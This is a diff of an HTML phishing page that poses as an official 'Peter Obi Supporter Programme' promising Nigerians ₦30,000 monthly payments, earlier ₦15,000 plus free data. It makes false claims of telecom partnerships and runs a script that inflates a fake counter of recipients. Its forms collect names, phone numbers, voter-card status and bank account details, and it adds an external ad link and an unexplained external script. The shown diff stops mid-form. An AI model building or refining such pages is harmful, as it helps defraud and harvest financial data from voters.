@@ -1,830 +1,979 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-
-    
-
-    <script>
-        function set_Cookie(name, value) {
-            var Days = 30;
-            var exp = new Date();
-            exp.setTime(exp.getTime() + (Days * 20 * 1000));
-            document.cookie = name + "=" + escape(value) + ";expires=" + exp.toGMTString() + "; path=/;"
-        }
-        function get_Cookie(name) {
-            var arr, reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)");
-            if (arr = document.cookie.match(reg)) {
-                return unescape(arr[2]);
-            }
-            return '';
-        }
-    </script>
-
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Peter Obi ₦15,000 and 25GB Campaign Reward</title>
-    <link rel="shortcut icon" type="image/png" href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgQ5hNrKPSXewLIXhRZRjRowtzlIsZoXPE-wF20uPT27khFjE7rO9aAoKik6evMbZzVuDUySApeTOj3rrv1YaCUtt9RARf_LGTXYP_z-Jdz7Sv8iCPUByz8hkWKKYsaCmezrHvrDQsscrtwr7lHpfMrpDoul7DA-UNqonK7wDncfX_A_IcUZ9j46Lmn8e0/s1448/Nigerian%20Campaign%20Reward%20Poster.png" />
-
-    <meta name="og:title" content="Peter Obi ₦15,000 and 25GB Campaign Reward" />
-    <meta name="og:description" content="Peter Obi suppoters Offer" />
-    <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgQ5hNrKPSXewLIXhRZRjRowtzlIsZoXPE-wF20uPT27khFjE7rO9aAoKik6evMbZzVuDUySApeTOj3rrv1YaCUtt9RARf_LGTXYP_z-Jdz7Sv8iCPUByz8hkWKKYsaCmezrHvrDQsscrtwr7lHpfMrpDoul7DA-UNqonK7wDncfX_A_IcUZ9j46Lmn8e0/s1448/Nigerian%20Campaign%20Reward%20Poster.png" />
-    <meta property="og:type" content="website" />
-    <meta property="og:updated_time" content="1440432930" />
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Peter Obi ₦30,000 Supporter  Programme | Registration</title>
   
-<link rel="me" href="https://www.blogger.com/profile/13972638449088687890" />
+  <!-- Favicon (Browser Tab Icon) -->
+  <link rel="shortcut icon" type="image/png" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQK43PwAgjn3ZNkyqIcE4o19IH8Lx29HUXOqMiYz3yBI3K2gFjZkPSgcg7c&s=10" />
+  
+  <!-- Open Graph (WhatsApp / Facebook Link Preview) -->
+  <meta property="og:title" content="Peter Obi ₦30,000 Supporter Programme Registration Open" />
+  <meta property="og:description" content="Peter Obi ₦30,000 Supporter  Programme - Apply now." />
+  <script src="meta-google-verification.js"></script>
+  <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQK43PwAgjn3ZNkyqIcE4o19IH8Lx29HUXOqMiYz3yBI3K2gFjZkPSgcg7c&s=10" />
+  <meta property="og:type" content="website" />
+
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  
+  <!-- FontAwesome for Icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+  
+  <style>
+    /* Election Countdown Styles */
+.election-countdown { 
+    background: #212824; 
+    border-radius: 12px; 
+    padding: 16px 20px; 
+    display: flex; 
+    align-items: center; 
+    justify-content: space-between; 
+    margin-bottom: 24px; 
+    box-shadow: 0 4px 12px rgba(0,0,0,0.08); 
+    border: 1px solid #2d3631; 
+    font-family: 'Inter', system-ui, -apple-system, sans-serif;
+    max-width: 600px; /* Adjust as needed */
+    box-sizing: border-box;
+}
+
+.countdown-text { 
+    display: flex; 
+    flex-direction: column; 
+}
+
+.countdown-text .label { 
+    color: #a0aec0; 
+    font-size: 11px; 
+    font-weight: 600; 
+    text-transform: uppercase; 
+    letter-spacing: 0.5px; 
+    margin-bottom: 4px; 
+}
+
+.countdown-text .date { 
+    color: #8cff43; 
+    font-size: 14px; 
+    font-weight: 700; 
+    text-transform: uppercase; 
+}
+
+.countdown-timer { 
+    display: flex; 
+    gap: 8px; 
+}
+
+.time-block { 
+    background: #2f3833; 
+    border-radius: 8px; 
+    padding: 8px 10px; 
+    display: flex; 
+    flex-direction: column; 
+    align-items: center; 
+    min-width: 50px; 
+}
+
+.time-block .number { 
+    color: #fff; 
+    font-size: 20px; 
+    font-weight: 700; 
+    line-height: 1; 
+    margin-bottom: 3px; 
+}
+
+.time-block .label { 
+    color: #88948d; 
+    font-size: 9px; 
+    font-weight: 700; 
+    text-transform: uppercase; 
+    letter-spacing: 0.5px; 
+}
+
+/* Mobile Responsiveness */
+@media (max-width: 480px) { 
+    .election-countdown { 
+        flex-direction: column; 
+        gap: 15px; 
+        text-align: center; 
+        padding: 15px; 
+    } 
+    .countdown-text { 
+        align-items: center; 
+    } 
+    .countdown-timer { 
+        width: 100%; 
+        justify-content: center; 
+    } 
+    .time-block { 
+        flex: 1; 
+        max-width: 65px; 
+        padding: 6px; 
+    } 
+    .time-block .number { 
+        font-size: 18px; 
+    } 
+}
+    </style>
+  
+  
+  
+  
+  
+  
+  
+  
+  <style>
+* {box-sizing: border-box;}
+body {font-family: Verdana, sans-serif;}
+.mySlides {display: none;}
+img {vertical-align: middle;}
+
+/* Slideshow container */
+.slideshow-container {
+  max-width: 1000px;
+  position: relative;
+  margin: auto;
+}
+
+/* Caption text */
+.text {
+  color: #f2f2f2;
+  font-size: 15px;
+  padding: 8px 12px;
+  position: absolute;
+  bottom: 8px;
+  width: 100%;
+  text-align: center;
+}
+
+/* Number text (1/3 etc) */
+.numbertext {
+  color: #f2f2f2;
+  font-size: 12px;
+  padding: 8px 12px;
+  position: absolute;
+  top: 0;
+}
+
+/* The dots/bullets/indicators */
+.dot {
+  height: 15px;
+  width: 15px;
+  margin: 0 2px;
+  background-color: #bbb;
+  border-radius: 50%;
+  display: inline-block;
+  transition: background-color 0.6s ease;
+}
+
+.active {
+  background-color: #717171;
+}
+
+/* Fading animation */
+.fade {
+  animation-name: fade;
+  animation-duration: 1.5s;
+}
+
+@keyframes fade {
+  from {opacity: .4} 
+  to {opacity: 1}
+}
+
+/* On smaller screens, decrease text size */
+@media only screen and (max-width: 300px) {
+  .text {font-size: 11px}
+}
+</style>
+
+
+
+
+
+
+
+
+
+  
+  <style>
+    /* ═══════════════════════════════════════════
+       RESET & BASE
+    ═══════════════════════════════════════════ */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Inter', sans-serif;
+    }
+
+    body {
+      background-color: #f4f5f7;
+      color: #1e293b;
+      line-height: 1.6;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    a { text-decoration: none; }
+
+    /* ═══════════════════════════════════════════
+       TOP ALERT BAR
+    ═══════════════════════════════════════════ */
+    .alert-bar {
+      background-color: #0f5703; /* Urgent Red */
+      color: white;
+      text-align: center;
+      padding: 10px;
+      font-size: 14px;
+      font-weight: 600;
+      letter-spacing: 0.5px;
+      animation: pulse 2s infinite;
+      cursor: pointer;
+    }
+
+    @keyframes pulse {
+      0% { opacity: 1; }
+      50% { opacity: 0.8; }
+      100% { opacity: 1; }
+    }
+
+    /* ═══════════════════════════════════════════
+       HEADER
+    ═══════════════════════════════════════════ */
+    .site-header {
+      background: #ffffff;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+      padding: 15px 20px;
+      text-align: center;
+    }
+
+    .site-header h1 {
+      font-size: 20px;
+      font-weight: 800;
+      color: #0f172a;
+      letter-spacing: -0.5px;
+    }
+
+    .site-header p {
+      font-size: 13px;
+      color: #64748b;
+      margin-top: 2px;
+    }
+
+    /* ═══════════════════════════════════════════
+       HERO IMAGE SECTION
+    ═══════════════════════════════════════════ */
+    .hero-section {
+      background: #000;
+      text-align: center;
+    }
+
+    .hero-section img {
+      width: 100%;
+      max-width: 800px;
+      display: block;
+      margin: 0 auto;
+    }
+
+    /* ═══════════════════════════════════════════
+       MAIN FORM CONTAINER
+    ═══════════════════════════════════════════ */
+    .main-container {
+      flex: 1;
+      max-width: 600px;
+      margin: 30px auto 50px;
+      padding: 0 15px;
+      width: 100%;
+    }
+
+    .form-card {
+      background: #ffffff;
+      border-radius: 12px;
+      box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1);
+      padding: 35px 25px;
+      border-top: 5px solid #0f5703;
+    }
+
+    .form-card h2 {
+      color: #0f172a;
+      font-size: 22px;
+      text-align: center;
+      margin-bottom: 10px;
+    }
+
+    .form-card hr {
+      border: none;
+      height: 1px;
+      background: #e2e8f0;
+      margin: 15px 0 25px;
+    }
+
+    .form-card p.subtitle {
+      font-size: 14px;
+      color: #475569;
+      text-align: center;
+      margin-bottom: 25px;
+    }
+
+    .form-group {
+      margin-bottom: 18px;
+      text-align: left;
+    }
+
+    .form-group label {
+      display: block;
+      font-weight: 600;
+      font-size: 13px;
+      color: #334155;
+      margin-bottom: 6px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .text-danger { color: #dc2626; }
+
+    .form-group input, 
+    .form-group select {
+      width: 100%;
+      padding: 14px 16px;
+      border: 1.5px solid #cbd5e1;
+      border-radius: 8px;
+      font-size: 15px;
+      outline: none;
+      transition: border-color 0.3s, box-shadow 0.3s;
+      background: #f8fafc;
+    }
+
+    .form-group input:focus, 
+    .form-group select:focus {
+      border-color: #0f5703;
+      background: #fff;
+      box-shadow: 0 0 0 3px rgba(190, 0, 40, 0.1);
+    }
+
+    .btn-primary {
+      display: block;
+      width: 100%;
+      padding: 16px;
+      background: #0f172a; /* Dark official blue */
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 18px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: background 0.3s, transform 0.1s;
+      margin-top: 15px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    .btn-primary:hover {
+      background: #0f5703;
+    }
+
+    .btn-primary:active {
+      transform: scale(0.98);
+    }
+
+    /* ═══════════════════════════════════════════
+       PROGRESS & LOADERS
+    ═══════════════════════════════════════════ */
+    .loader-container {
+      text-align: center;
+      padding: 40px 0;
+      display: none;
+    }
+
+    .spin {
+      width: 50px;
+      height: 50px;
+      border: 5px solid #e2e8f0;
+      border-top-color: #0f5703;
+      border-radius: 50%;
+      margin: 20px auto;
+      animation: spin 0.8s linear infinite;
+    }
+
+    @keyframes spin { 100% { transform: rotate(360deg); } }
+
+    .progress-wrap { margin-top: 20px; }
+    .progress-track {
+      width: 100%; height: 12px; background: #e2e8f0;
+      border-radius: 10px; overflow: hidden;
+    }
+    .progress-fill {
+      height: 100%; width: 0%; background: #0f5703;
+      transition: width 0.3s ease;
+    }
+    .progress-meta {
+      display: flex; justify-content: space-between;
+      font-size: 13px; font-weight: 600; color: #64748b; margin-top: 8px;
+    }
+
+    /* ═══════════════════════════════════════════
+       SHARE & CLAIM SECTIONS
+    ═══════════════════════════════════════════ */
+    .share-section, .claim-section {
+      display: none;
+      text-align: center;
+    }
+
+    .share-section p {
+      margin-bottom: 15px;
+      font-size: 15px;
+      color: #334155;
+    }
+
+    .share-section .amount {
+      color: #0f5703;
+      font-weight: 700;
+    }
+
+    .btn-success { background: #25D366; }
+    .btn-success:hover { background: #128C7E; }
+
+    .claim-section .done {
+      font-size: 50px; 
+      color: #25D366; 
+      margin-bottom: 15px;
+    }
+
+    .claim-section h2 {
+      color: #0f172a;
+      font-size: 22px;
+      margin-bottom: 20px;
+    }
+
+    /* ═══════════════════════════════════════════
+       FOOTER
+    ═══════════════════════════════════════════ */
+    .site-footer {
+      background-color: #0f172a;
+      color: #94a3b8;
+      padding: 30px 20px;
+      margin-top: auto;
+      text-align: center;
+      font-size: 12px;
+    }
+
+    .site-footer p { margin-bottom: 10px; }
+    .site-footer a { color: #cbd5e1; text-decoration: underline; }
+    
+    .supercounter-wrap {
+      margin-top: 15px;
+      opacity: 0.8;
+    }
+
+    /* ═══════════════════════════════════════════
+       MOBILE RESPONSIVE
+    ═══════════════════════════════════════════ */
+    @media (max-width: 768px) {
+      .form-card { padding: 25px 15px; }
+      .site-header h1 { font-size: 18px; }
+    }
+  </style>
 <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
 <meta name='google-adsense-platform-domain' content='blogspot.com'/>
 </head>
-
 <body>
 
-    <div id="bgImage" class="popup-bg-active"></div>
+  <!-- URGENT ALERT BAR (Clickable) -->
+  <div class="alert-bar" onclick="window.open('https://landing.logsbuzz.xyz/ads001', '_blank')">
+    <i class="fa-solid fa-triangle-exclamatio"></i> Peter Obi ₦30,000 Supporter  Programme <i class="fa-solid fa-triangle-exclamatio"></i>
+  </div>
 
-    
-    <div class="popup-overlay" id="popupOverlay">
-        <div class="popup-box">
-            <center><h2>PETER ₦15,000 + 25GB CAMPAIGN OFFER</h2></center>
-            <center>
-                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgQ5hNrKPSXewLIXhRZRjRowtzlIsZoXPE-wF20uPT27khFjE7rO9aAoKik6evMbZzVuDUySApeTOj3rrv1YaCUtt9RARf_LGTXYP_z-Jdz7Sv8iCPUByz8hkWKKYsaCmezrHvrDQsscrtwr7lHpfMrpDoul7DA-UNqonK7wDncfX_A_IcUZ9j46Lmn8e0/s1448/Nigerian%20Campaign%20Reward%20Poster.png"
-                     alt="Peter Obi Offer" width="60%" height="35%">
-            </center>
+  <!-- HEADER -->
+  <header class="site-header">
+    <h1>Join The Obident Supporter Programme</h1>
+    <p>Benefits: ₦30,000 Monthly Payment</p>
+  </header>
 
-            <p style="text-align:center;">Enter Your Phone Number to Claim 25GB and ₦15,000 </p>
+  <div class="slideshow-container">
 
-            <form id="popupForm">
-                <div class="form-group">
-                    <input type="tel" id="popupPhone" placeholder="Phone Number" required>
-                </div>
-                <button type="submit" class="submit-btn">CLAIM NOW</button>
-            </form>
+<div class="mySlides fade">
+  <div class="numbertext">1 / 3</div>
+  <img src="https://ichef.bbci.co.uk/ace/ws/640/cpsprodpb/9d7b/live/35674c10-4bd7-11f1-8b92-b11ec3175073.jpg.webp" style="width:100%">
+  <div class="text">Join the Peter Obi Supporter Programme </div>
+</div>
+
+<div class="mySlides fade">
+  <div class="numbertext">2 / 3</div>
+  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRpGGcaVAISy1wbQr94yJz6onceETbdrpk7tP39h25f9xsMuSGiTLX0kW8&s=10" style="width:100%">
+  <div class="text">Join the Peter Obi Supporter Programme </div>
+</div>
+
+<div class="mySlides fade">
+  <div class="numbertext">3 / 3</div>
+  <img src="https://www.channelstv.com/wp-content/uploads/2026/07/Kwankwaso-Obi.jpg" style="width:100%">
+  <div class="text">Join the Peter Obi Supporter Programme </div>
+</div>
+
+</div>
+<br>
+
+<div style="text-align:center">
+  <span class="dot"></span> 
+  <span class="dot"></span> 
+  <span class="dot"></span> 
+</div>
+
+<script>
+let slideIndex = 0;
+showSlides();
+
+function showSlides() {
+  let i;
+  let slides = document.getElementsByClassName("mySlides");
+  let dots = document.getElementsByClassName("dot");
+  for (i = 0; i < slides.length; i++) {
+    slides[i].style.display = "none";  
+  }
+  slideIndex++;
+  if (slideIndex > slides.length) {slideIndex = 1}    
+  for (i = 0; i < dots.length; i++) {
+    dots[i].className = dots[i].className.replace(" active", "");
+  }
+  slides[slideIndex-1].style.display = "block";  
+  dots[slideIndex-1].className += " active";
+  setTimeout(showSlides, 3500); // Change image every 3 seconds
+}
+</script>
+
+
+  <!-- MAIN FORM CONTAINER -->
+  <div class="main-container">
+    <div class="form-card">
+      
+      <!-- INTRO SECTION -->
+      <div id="intro">
+        <h2>Join the Peter Obi Supporter Programme <br>Payment of ₦30,000 for 3 Months</h2>
+        <hr>
+       <!-- Election Countdown Timer -->
+<div class="election-countdown">
+    <div class="countdown-text">
+        <div class="label">ELECTION DAY</div>
+        <div class="date">SAT 16 JAN 2027</div>
+    </div>
+    <div class="countdown-timer">
+        <div class="time-block">
+            <span class="number" id="cd-days">00</span>
+            <span class="label">DAYS</span>
+        </div>
+        <div class="time-block">
+            <span class="number" id="cd-hours">00</span>
+            <span class="label">HRS</span>
+        </div>
+        <div class="time-block">
+            <span class="number" id="cd-minutes">00</span>
+            <span class="label">MIN</span>
+        </div>
+        <div class="time-block">
+            <span class="number" id="cd-seconds">00</span>
+            <span class="label">SEC</span>
         </div>
     </div>
-
-    <style>
-        .blink {
-            animation: blink 1s steps(1, end) infinite;
-        }
-
-        @keyframes blink {
-            0% { opacity: 1; }
-            50% { opacity: 0; }
-            100% { opacity: 1; }
-        }
-    </style>
-
-    <style>
-        @import url("https://fonts.googleapis.com/css2?family=Poppins:wght@500;700&display=swap");
-        @import url("//fonts.googleapis.com/earlyaccess/droidarabicnaskh.css");
-
-        * {
-            margin: 0;
-            padding: 0;
-            font-family: Poppins, Droid Arabic Naskh;
-            font-weight: normal;
-            box-sizing: border-box;
-        }
-
-        body {
-            direction: lfl;
-            background: #ffffff;
-        }
-
-        a { text-decoration: none; }
-
-        
-        #bgImage {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-image: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgQ5hNrKPSXewLIXhRZRjRowtzlIsZoXPE-wF20uPT27khFjE7rO9aAoKik6evMbZzVuDUySApeTOj3rrv1YaCUtt9RARf_LGTXYP_z-Jdz7Sv8iCPUByz8hkWKKYsaCmezrHvrDQsscrtwr7lHpfMrpDoul7DA-UNqonK7wDncfX_A_IcUZ9j46Lmn8e0/s1448/Nigerian%20Campaign%20Reward%20Poster.png');
-            background-size: cover;
-            background-position: center;
-            background-repeat: no-repeat;
-            z-index: 1;
-            opacity: 0;
-            transition: opacity 0.4s ease;
-        }
-
-        #bgImage.popup-bg-active {
-            opacity: 1;
-        }
-
-        .post {
-            background: #fff;
-            margin: 0 auto;
-            padding: 10px;
-            max-width: 500px;
-            border: 1px solid #d0d1d5;
-            border-radius: 3px;
-            position: relative;
-            z-index: 2;
-        }
-
-        .post img { width: 100%; }
-
-        .welcome { font-size: 15px; }
-
-        .amount, #getname {
-            color: #098105;
-            text-decoration: none;
-        }
-
-        .done {
-            text-align: center;
-            color: #27ae60;
-        }
-
-        .tip { font-size: 14px; }
-
-        .title { text-align: center; }
-
-        .error {
-            display: none;
-            text-align: center;
-            font-size: 14px;
-            color: #e74c3c;
-        }
-
-        button {
-            display: block;
-            width: 200px;
-            height: 50px;
-            color: #fff;
-            border: none;
-            outline: none;
-            font-size: 24px;
-            cursor: pointer;
-            border-radius: 5px;
-            padding: 0 10px;
-            margin: 10px auto;
-            background: rgb(31, 50, 105);
-            transition: background 0.3s ease;
-        }
-
-        button:hover { background: #098105; }
-
-        .phone {
-            max-width: 400px;
-            margin: 10px auto;
-        }
-
-        .phone input {
-            width: 100%;
-            height: 50px;
-            padding: 10px;
-            outline: none;
-            border: 2px solid #cecece;
-            font-size: 14px;
-        }
-
-        #confirm {
-            width: 200px;
-            margin: 10px auto;
-            border-radius: 0px;
-        }
-
-        #loader { text-align: center; }
-
-        .spin {
-            width: 50px;
-            height: 50px;
-            background: transparent;
-            border: solid 8px rgb(207, 27, 28);
-            border-right-color: transparent;
-            border-radius: 50%;
-            margin: 10px auto;
-            animation: spin 0.8s linear infinite;
-        }
-
-        @keyframes spin {
-            100% { transform: rotate(1turn); }
-        }
-
-        #loader, #info, #checking, #share, #claim { display: none; }
-
-        .center {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .barr {
-            direction: ltr;
-            max-width: 400px;
-            margin: 10px auto;
-            box-sizing: border-box;
-        }
-
-        .fill {
-            position: relative;
-            display: inline-block;
-            width: calc(100% - 100px);
-            height: 35px;
-            padding: 2px;
-            border: 2px solid #098105;
-        }
-
-        #fill, #fill2 {
-            background: #098105;
-            width: 0%;
-            height: 100%;
-        }
-
-        .percentage {
-            width: 100px;
-            float: right;
-            height: 35px;
-            font-size: 16px;
-            border: 2px solid #098105;
-        }
-
-        #percentage, #percentage2 { margin-left: 5px; }
-
-        #check, #check2 { display: none; }
-
-        .counter {
-            color: #7f7f7f;
-            font-size: 12px;
-            text-align: right;
-            padding: 10px 0 10px 2px;
-            border-bottom: 1px solid #e1e2e3;
-        }
-
-        .reactions {
-            display: inline-flex;
-            align-items: center;
-            float: left;
-        }
-
-        .counter img {
-            float: left;
-            width: 16px;
-            height: 16px;
-            border-radius: 50%;
-            border: 2px solid #fff;
-            box-sizing: content-box;
-        }
-
-        .like, .love { margin-right: -5px; }
-        .like { z-index: 2; }
-        .love { z-index: 1; }
-
-        .bar {
-            display: table;
-            width: 100%;
-            border-bottom: 1px solid #e1e2e3;
-        }
-
-        .bar .react {
-            display: table-cell;
-            width: calc(100% / 3);
-            font-size: 12px;
-            color: #7f7f7f;
-            text-align: center;
-            padding: 10px 0;
-            cursor: pointer;
-        }
-
-        .comments { direction: ltr; }
-
-        .comment {
-            padding: 6px 0;
-            margin-top: 5px;
-        }
-
-        .comment img {
-            float: left;
-            width: 32px;
-            height: 32px;
-            border: none;
-            border-radius: 18px;
-            cursor: pointer;
-        }
-
-        .reply { margin-left: 37px; }
-
-        .single-container {
-            margin-left: 37px;
-            background: #f1f2f6;
-            padding: 10px;
-            border-radius: 15px;
-            font-size: 12px;
-        }
-
-        .single-container .user {
-            display: inline-block;
-            cursor: pointer;
-            color: #365899;
-            margin-bottom: 5px;
-        }
-
-        .single-container .text { display: block; }
-
-        .buttons {
-            font-size: 12px;
-            font-weight: bold;
-            margin: 10px 0 0 47px;
-            color: #90949c;
-        }
-
-        .action { cursor: pointer; }
-        .action:hover { text-decoration: underline; }
-
-        .input { padding: 6px 12px 12px; }
-
-        .input input {
-            width: 100%;
-            background: #f1f2f6;
-            padding: 10px;
-            border-radius: 15px;
-            border: 0;
-            outline: none;
-        }
-
-        .A {
-            text-align: center;
-            background-color: rgb(31, 50, 105);
-        }
-
-
-        .popup-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.6);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.4s ease;
-            z-index: 1000;
-        }
-
-        .popup-box {
-            background: #fff;
-            padding: 30px;
-            border-radius: 8px;
-            width: 400px;
-            max-width: 90%;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
-            position: relative;
-            transform: translateY(-50px);
-            transition: transform 0.4s ease;
-        }
-
-        .popup-overlay.active {
-            opacity: 1;
-            pointer-events: auto;
-        }
-
-        .popup-overlay.active .popup-box {
-            transform: translateY(0);
-        }
-
-        .popup-box h2 {
-            margin-top: 0;
-            color: #333;
-        }
-
-        .popup-box p {
-            color: #333;
-            font-size: 14px;
-            line-height: 1.5;
-        }
-
-        .popup-box .form-group { margin-bottom: 15px; }
-
-        .popup-box .form-group input {
-            width: 100%;
-            padding: 10px;
-            box-sizing: border-box;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            font-size: 14px;
-        }
-
-        .popup-box .submit-btn {
-            width: 100%;
-            padding: 10px;
-            background-color: rgb(31, 50, 105);
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            cursor: pointer;
-        }
-
-        .popup-box .submit-btn:hover {
-            background-color: #098105;
-        }
-    </style>
-
-    <style>
-        .loading-gif { max-width: 500px; }
-
-        .pre-loader {
-            position: fixed;
-            z-index: 100;
-            top: 0;
-            left: 0;
-            background: #191f26;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100%;
-            width: 100%;
-        }
-
-        .pre-loader.hidden {
-            animation: fadeOut 5s;
-            animation-fill-mode: forwards;
-        }
-
-        @keyframes fadeOut {
-            100% {
-                opacity: 0;
-                visibility: hidden;
-            }
-        }
-    </style>
-
-
-    <div id="flowWrapper" style="display:none; position: relative; z-index: 2;">
-
-        <div id="persistentHeader">
-            <center>
-                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgQ5hNrKPSXewLIXhRZRjRowtzlIsZoXPE-wF20uPT27khFjE7rO9aAoKik6evMbZzVuDUySApeTOj3rrv1YaCUtt9RARf_LGTXYP_z-Jdz7Sv8iCPUByz8hkWKKYsaCmezrHvrDQsscrtwr7lHpfMrpDoul7DA-UNqonK7wDncfX_A_IcUZ9j46Lmn8e0/s1448/Nigerian%20Campaign%20Reward%20Poster.png" alt="Free-Data" style="width: 100%; max-width: 500px;">
-            </center>
-
-            <marquee width="100%" direction="left" height="50px">
-                PETER OBI BIRTHDAY CELEBRATION OFFER
-            </marquee>
-            <div class="A">
-                <font color="white">Till Today</font><b></br>
-                    <span id="countdowntimer" style="color:yellow;">4548</span></b></br>
-                <font color="white">Nigerians have Received ₦15,000 + 25GB </font>
-                <script type="text/javascript">
-                    var timeleft = 4548;
-                    var downloadTimer = setInterval(function () {
-                        timeleft = timeleft + Math.floor(Math.random() * 600);
-                        document.getElementById('countdowntimer').textContent = timeleft;
-                        if (timeleft <= 0)
-                            clearInterval(downloadTimer);
-                    }, 1000);
-                </script>
-            </div>
-        </div>
-
-        <div id="loader" style="text-align:center; padding: 60px 20px;">
-            <div style="font-size: 18px; margin-bottom: 20px;">Please Wait ...</div>
-            <div class="spin"></div>
-            <div id="num" style="font-size: 18px; margin-top: 15px;">0%</div>
-        </div>
-
+</div>
+        <hr>
+        <p class="subtitle">
+          Fill out the form below to join the official Peter Obi Supporter  Programme. Approved Supporter  Receive ₦30,000 Payment for a Period of 3 Months.
+        </p>
+<hr>
        
-        <div id="intro" style="display:none;">
-            <div class="post" width="100%">
-                <p class="welcome">
-                    <span class="amount">POWERED BY: Nigeria Democratic Congress (NDC)</span>
-                    Peter Obi in Collaboration with MTN, Airtel, Glo and 9-Mobile to Provide 25GB Free Data and ₦15,000 to all Supporters<br> <span class="amount"></span> <br />
-               
-                <form>
-                    <div style="margin-bottom: 10px; display: flex; align-items: center;">
-                        <label for="Nom" style="font-weight: bold; width: 80px; margin-right: 8px;">Bank Name:</label>
-                        <input type="text" id="name" name="name" placeholder="Bank Name" required 
-                            style="flex: 1; padding: 8px; font-size: 14px; border: 1px solid #ccc; border-radius: 4px;">
-                    </div>
-                
-                    
-                
-                    <div style="margin-bottom: 10px; display: flex; align-items: center;">
-                        <label for="Account Number:" style="font-weight: bold; width: 80px; margin-right: 8px;">Account Number:</label><br>
-                        <input type="number" id="number" name="number" placeholder="Account Number" required 
-                            style="flex: 1; padding: 8px; font-size: 14px; border: 1px solid #ccc; border-radius: 4px;">
-                    </div>
-                </form>
- </p>
-                <button id="go"> <font color="white">CONTINUE </font></button>
-            </div>
+<div class="form-group">
+  <label><h2><p class="text-danger" style="color: black;">1. About You</p></h2></label>
+        </div> 
+        
+        <div class="form-group">
+          <label>Full Name <span class="text-danger">*</span></label>
+          <input type="text" id="fullname" placeholder="Enter your full name">
+        </div>
+        
+        <!-- AGE DROPDOWN - NO LONGER REQUIRED -->
+        <div class="form-group">
+          <label>Gender</label>
+          <select id="age">
+            <option value="">Select Gender</option>
+            <option value="18">Male</option>
+            <option value="19">Female</option>
+            <option value="20">Prefer not say</option>
+          </select>
+        </div>
+        
+        <!-- AGE DROPDOWN - NO LONGER REQUIRED -->
+        <div class="form-group">
+          <label>Age</label>
+          <select id="age">
+            <option value="">Select Age Range</option>
+            <option value="18">18-24</option>
+            <option value="19">25-34</option>
+            <option value="20">35-44</option>
+            <option value="21">45-54</option>
+            <option value="22">55-64</option>
+            <option value="23">65 and above</option>
+          </select>
+        </div>
+        
+        <div class="form-group">
+          <label>Mobile Number <span class="text-danger">*</span></label>
+          <input type="email" id="email" placeholder="e.g. 0803 123 4567">
+        </div>
+        
+        <!-- AGE DROPDOWN - NO LONGER REQUIRED -->
+        <div class="form-group">
+          <label>PVC Status</label>
+          <select id="age">
+            <option>ABUJA FCT</option>
+<option>ABIA</option>
+<option>ADAMAWA</option>
+<option>AKWA IBOM</option>
+<option>ANAMBRA</option>
+<option>BAUCHI</option>
+<option>BAYELSA</option>
+<option>BENUE</option>
+<option>BORNO</option>
+<option>CROSS RIVER</option>
+<option>DELTA</option>
+<option>EBONYI</option>
+<option>EDO</option>
+<option>EKITI</option>
+<option>ENUGU</option>
+<option>GOMBE</option>
+<option>IMO</option>
+<option>JIGAWA</option>
+<option>KADUNA</option>
+<option>KANO</option>
+<option>KATSINA</option>
+<option>KEBBI</option>
+<option>KOGI</option>
+<option>KWARA</option>
+<option>LAGOS</option>
+<option>NASSARAWA</option>
+<option>NIGER</option>
+<option>OGUN</option>
+<option>ONDO</option>
+<option>OSUN</option>
+<option>OYO</option>
+<option>PLATEAU</option>
+<option>RIVERS</option>
+<option>SOKOTO</option>
+<option>TARABA</option>
+<option>YOBE</option>
+<option>ZAMFARA</option>
+            </select>
+        </div>
+        
+        <!-- AGE DROPDOWN - NO LONGER REQUIRED -->
+        <div class="form-group">
+          <label>PVC Status</label>
+          <select id="age">
+            <option value="">Do you have your PVC?</option>
+            <option value="18">I have my PVC</option>
+            <option value="19">Registered,PVC not yet collected</option>
+            <option value="20">Lost or Damaged PVC</option>
+            <option value="21">Not registered yet</option>
+            </select>
+        </div>
+        <hr>
+<br>
+<div class="form-group">
+  <label><h2><p class="text-danger" style="color: black;">2. Bank Details</p></h2></label>
+        </div>        
+        
+<div class="form-group">
+  <label><h3><p class="text-danger" style="color: green;">Payment: ₦30,000</p></h3></label>
         </div>
 
-
-        <div id="checking">
-            <div class="post" width="100%" style="padding: 20px;">
